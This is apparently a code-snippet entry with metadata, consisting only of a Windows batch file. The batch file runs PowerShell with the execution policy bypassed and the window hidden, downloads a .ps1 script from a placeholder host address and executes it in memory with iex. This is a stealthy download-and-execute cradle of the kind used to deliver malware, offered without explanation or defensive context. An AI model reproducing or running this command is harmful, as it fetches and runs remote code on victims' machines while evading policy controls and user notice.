---
id: 41cbef3f-ae8c-4b41-a8aa-8e3d4907af37
type: code
language: ''
verified: false
created_at: '2020-03-13T01:39:00.319830+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 41cbef3f

```
@ECHO OFF
powershell.exe -ep bypass -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
```
